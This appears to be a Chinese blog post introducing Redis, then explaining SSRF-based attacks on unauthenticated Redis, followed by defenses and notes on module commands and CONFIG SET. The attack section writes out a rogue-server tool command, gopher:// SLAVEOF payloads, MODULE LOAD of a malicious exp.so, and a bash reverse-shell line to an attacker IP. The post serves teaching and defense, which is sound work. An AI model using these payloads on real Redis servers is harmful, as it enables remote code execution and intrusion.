    <h4>
     <a id="Redis__2">
     </a>
     Redis 详细解析与介绍
    </h4>
    <p>
     <strong>
      Redis
     </strong>
     （Remote Dictionary Server）是一个开源的高性能键值对（Key-Value）数据库，支持多种数据结构（如字符串、哈希、列表、集合等），广泛应用于缓存、消息队列、实时数据分析等场景。
    </p>
    <h5>
     <a id="_6">
     </a>
     核心特点：
    </h5>
    <ol>
     <li>
      <strong>
       内存存储
      </strong>
      ：数据主要存储在内存中，读写性能极高（10万+/秒 QPS）。
     </li>
     <li>
      <strong>
       持久化支持
      </strong>
      ：支持
      <code>
       RDB
      </code>
      （快照）和
      <code>
       AOF
      </code>
      （追加日志）两种持久化方式。
     </li>
     <li>
      <strong>
       多数据结构
      </strong>
      ：支持字符串、哈希、列表、集合、有序集合等。
     </li>
     <li>
      <strong>
       单线程模型
      </strong>
      ：避免锁竞争，通过异步I/O处理高并发。
     </li>
     <li>
      <strong>
       高可用与集群
      </strong>
      ：支持主从复制、哨兵模式（Sentinel）和集群模式（Cluster）。
     </li>
    </ol>

    <h4>
     <a id="SSRFRedis_57">
     </a>
     SSRF漏洞利用与Redis相关命令
    </h4>
    <h5>
     <a id="SSRF_59">
     </a>
     什么是SSRF？
    </h5>
    <p>
     SSRF（Server-Side Request Forgery）是攻击者诱使服务器向内部或第三方系统发起恶意请求的漏洞。结合未授权访问的Redis服务，攻击者可通过SSRF执行高危操作。
    </p>
    <h5>
     <a id="Redis_SSRF_62">
     </a>
     Redis SSRF利用场景
    </h5>
    <ol>
     <li>
      <p>
       <strong>
        目标环境
       </strong>
       ：
      </p>
      <ul>
       <li>
        Redis未设置密码（默认无认证）。
       </li>
       <li>
        Redis服务暴露在内网或公网（默认端口6379）。
       </li>
      </ul>
     </li>
     <li>
      <p>
       <strong>
        攻击步骤
       </strong>
       ：
      </p>
      <ul>
       <li>
        <strong>
         探测Redis服务
        </strong>
        ：通过SSRF访问
        <code>
         http://victim.com/ssrf?url=redis://内网IP:6379
        </code>
        。
       </li>
       <li>
        <strong>
         执行恶意命令
        </strong>
        ：利用Redis协议发送命令，如写入Webshell、反弹Shell等。
       </li>
      </ul>
     </li>
    </ol>

    <h4>
     <a id="Redis__103">
     </a>
     Redis 主从复制攻击详解整合
    </h4>
    <h5>
     <a id="_106">
     </a>
     <strong>
      主从复制攻击原理
     </strong>
    </h5>
    <p>
     Redis 主从复制（Replication）机制允许从节点（Slave）同步主节点（Master）的数据。攻击者可利用此特性，
     <strong>
      强制目标Redis作为从节点连接到攻击者控制的恶意主节点
     </strong>
     ，通过同步恶意数据（如加载动态模块或写入Webshell），最终实现远程代码执行（RCE）。
    </p>
    <h5>
     <a id="_109">
     </a>
     <strong>
      攻击前提条件
     </strong>
    </h5>
    <ol>
     <li>
      <strong>
       Redis未授权访问
      </strong>
      ：目标Redis无密码认证或密码被破解。
     </li>
     <li>
      <strong>
       SSRF漏洞存在
      </strong>
      ：可通过SSRF触发Redis协议交互（如
      <code>
       gopher://
      </code>
      、
      <code>
       dict://
      </code>
      ）。
     </li>
     <li>
      <strong>
       目标Redis支持模块加载
      </strong>
      （4.x以上版本）或
      <strong>
       允许文件写入
      </strong>
      （如Web目录可写）。
     </li>
    </ol>
    <h5>
     <a id="_115">
     </a>
     <strong>
      攻击步骤与命令
     </strong>
    </h5>
    <h6>
     <a id="1__117">
     </a>
     <strong>
      1. 准备恶意主节点
     </strong>
    </h6>
    <ul>
     <li>
      使用工具搭建恶意Redis主节点（如
      <a href="https://github.com/n0b0dyCN/Redis-Rogue-Server">
       Redis Rogue Server
      </a>
      ）：
      <pre><code class="prism language-bash">python3 redis-rogue-server.py <span class="token parameter variable">--rhost</span> <span class="token operator">&lt;</span>目标IP<span class="token operator">&gt;</span> <span class="token parameter variable">--rport</span> <span class="token number">6379</span> <span class="token parameter variable">--lhost</span> <span class="token operator">&lt;</span>攻击者IP<span class="token operator">&gt;</span> <span class="token parameter variable">--lport</span> <span class="token number">21000</span>
</code></pre>
      <ul>
       <li>
        该工具会自动生成恶意模块（
        <code>
         .so
        </code>
        文件），通过主从复制同步到目标Redis。
       </li>
      </ul>
     </li>
    </ul>
    <h6>
     <a id="2_Redis_124">
     </a>
     <strong>
      2. 强制目标Redis成为从节点
     </strong>
    </h6>
    <p>
     通过SSRF发送
     <code>
      SLAVEOF
     </code>
     命令，将目标Redis设置为恶意主节点的从节点：
    </p>
    <pre><code class="prism language-http"># 通过Gopher协议发送SLAVEOF命令（需URL编码）
GET /ssrf?url=gopher://target-redis:6379/_*3%0d%0a$8%0d%0aSLAVEOF%0d%0a$&lt;攻击者IP长度&gt;%0d%0a&lt;攻击者IP&gt;%0d%0a$5%0d%0a21000%0d%0a
</code></pre>
    <ul>
     <li>
      <strong>
       关键命令
      </strong>
      ：
      <code>
       SLAVEOF &lt;攻击者IP&gt; &lt;端口&gt;
      </code>
      。
     </li>
    </ul>
    <h6>
     <a id="3__132">
     </a>
     <strong>
      3. 数据同步与恶意模块加载
     </strong>
    </h6>
    <ol>
     <li>
      目标Redis连接恶意主节点后，自动同步数据。
     </li>
     <li>
      恶意主节点发送包含恶意模块（如
      <code>
       exp.so
      </code>
      ）的备份文件。
     </li>
     <li>
      通过
      <code>
       MODULE LOAD
      </code>
      命令加载恶意模块，执行任意命令：
      <pre><code class="prism language-bash">MODULE LOAD ./exp.so
system.exec <span class="token string">"id"</span>  <span class="token comment"># 通过模块函数执行系统命令</span>
</code></pre>
     </li>
    </ol>

    <h5>
     <a id="_147">
     </a>
     <strong>
      防御措施
     </strong>
    </h5>
    <ol>
     <li>
      <strong>
       禁用高危命令
      </strong>
      ：
      <br/>
      在
      <code>
       redis.conf
      </code>
      中禁用
      <code>
       SLAVEOF
      </code>
      和
      <code>
       MODULE
      </code>
      相关命令：
      <pre><code class="prism language-conf">rename-command SLAVEOF ""
rename-command MODULE ""
</code></pre>
     </li>
     <li>
      <strong>
       启用认证
      </strong>
      ：
      <br/>
      强制使用密码访问：
      <pre><code class="prism language-conf">requirepass &lt;强密码&gt;
</code></pre>
     </li>
     <li>
      <strong>
       网络隔离
      </strong>
      ：
      <ul>
       <li>
        限制Redis仅监听内网（
        <code>
         bind 127.0.0.1
        </code>
        ）。
       </li>
       <li>
        防火墙规则禁止外部访问Redis端口（6379）。
       </li>
      </ul>
     </li>
     <li>
      <strong>
       最小化模块功能
      </strong>
      ：
      <br/>
      非必要场景禁用Redis模块加载。
     </li>
    </ol>
    <h5>
     <a id="_165">
     </a>
     <strong>
      攻击案例演示
     </strong>
    </h5>
    <ol>
     <li>
      <strong>
       场景
      </strong>
      ：存在SSRF漏洞的Web应用，内网Redis未授权访问。
     </li>
     <li>
      <strong>
       利用
      </strong>
      ：
     </li>
    </ol>
    <pre><code class="prism language-http">   # 通过SSRF发送SLAVEOF命令
   http://vuln-web.com/ssrf?url=gopher://127.0.0.1:6379/_*3%0d%0a$8%0d%0aSLAVEOF%0d%0a$14%0d%0a192.168.1.100%0d%0a$5%0d%0a21000%0d%0a
</code></pre>
    <ol start="3">
     <li>
      <strong>
       结果
      </strong>
      ：目标Redis加载恶意模块，攻击者执行
      <code>
       system.exec "bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1"
      </code>
      反弹Shell。
     </li>
    </ol>

    <h4>
     <a id="Redis__178">
     </a>
     <code>
      Redis
     </code>
     模块管理
    </h4>
    <h5>
     <a id="_179">
     </a>
     <strong>
      一、模块管理命令
     </strong>
    </h5>
    <ol>
     <li>
      <p>
       <strong>
        <code>
         MODULE LIST
        </code>
       </strong>
       <br/>
       查看当前已加载的所有模块，返回模块名称、版本及描述信息。例如：
      </p>
      <pre><code class="prism language-bash">MODULE LIST
</code></pre>
      <p>
       该命令常用于确认模块是否加载成功。
      </p>
     </li>
     <li>
      <p>
       <strong>
        <code>
         MODULE LOAD &lt;path&gt; [arg1 arg2 ...]
        </code>
       </strong>
       <br/>
       动态加载指定路径的模块（
       <code>
        .so
       </code>
       文件），支持传递参数到模块的
       <code>
        RedisModule_OnLoad
       </code>
       函数。例如：
      </p>
      <pre><code class="prism language-bash">MODULE LOAD /path/to/my_module.so arg1 arg2
</code></pre>
      <p>
       参数会通过
       <code>
        argv
       </code>
       和
       <code>
        argc
       </code>
       传递给模块的初始化函数 。
      </p>
     </li>
     <li>
      <p>
       <strong>
        <code>
         MODULE UNLOAD &lt;module-name&gt;
        </code>
       </strong>
       <br/>
       卸载指定名称的模块（需使用模块注册时的名称，而非文件名）。例如：
      </p>
      <pre><code class="prism language-bash">MODULE UNLOAD my_module
</code></pre>
      <p>
       若模块定义了
       <code>
        RedisModule_OnUnload
       </code>
       函数，卸载时会自动调用该函数进行资源清理 。
      </p>
     </li>
    </ol>
    <h5>
     <a id="_201">
     </a>
     <strong>
      二、配置文件加载模块
     </strong>
    </h5>
    <p>
     在 Redis 启动时通过
     <code>
      redis.conf
     </code>
     配置文件加载模块：
    </p>
    <pre><code class="prism language-bash">loadmodule /path/to/module.so <span class="token punctuation">[</span>arg1 arg2 <span class="token punctuation">..</span>.<span class="token punctuation">]</span>
</code></pre>
    <p>
     此方式适合生产环境，确保模块随 Redis 服务启动自动加载。
    </p>

    <h4>
     <a id="Redis_CONFIG_SET__210">
     </a>
     <code>
      Redis
     </code>
     CONFIG SET 命令的核心功能、用法及注意事项
    </h4>
    <h5>
     <a id="_211">
     </a>
     <strong>
      一、命令功能
     </strong>
    </h5>
    <p>
     <code>
      CONFIG SET
     </code>
     允许在 Redis
     <strong>
      不重启
     </strong>
     的情况下动态修改服务器配置参数，适用于调整内存限制、持久化策略、日志行为等场景。
     <br/>
     <strong>
      主要特性
     </strong>
     ：
    </p>
    <ol>
     <li>
      <strong>
       实时生效
      </strong>
      ：修改的参数会立即加载并影响后续操作。
     </li>
     <li>
      <strong>
       支持参数广泛
      </strong>
      ：涵盖大多数
      <code>
       redis.conf
      </code>
      中的配置项（如
      <code>
       maxmemory
      </code>
      、
      <code>
       save
      </code>
      、
      <code>
       appendonly
      </code>
      等）。
     </li>
     <li>
      <strong>
       灵活性
      </strong>
      ：支持从 RDB 快照切换为 AOF 持久化，或同时启用两者。
     </li>
    </ol>
    <h5>
     <a id="_218">
     </a>
     <strong>
      二、语法与基本用法
     </strong>
    </h5>
    <h5>
     <a id="_219">
     </a>
     <strong>
      语法
     </strong>
    </h5>
    <pre><code class="prism language-bash">CONFIG SET parameter value <span class="token punctuation">[</span>parameter value <span class="token punctuation">..</span>.<span class="token punctuation">]</span>  
</code></pre>
    <ul>
     <li>
      <strong>
       单参数设置
      </strong>
      ：
      <code>
       CONFIG SET maxmemory 4gb
      </code>
     </li>
     <li>
      <strong>
       多参数设置
      </strong>
      （Redis 7.0+）：
      <code>
       CONFIG SET maxmemory 4gb save "900 1 300 10"
      </code>
     </li>
    </ul>
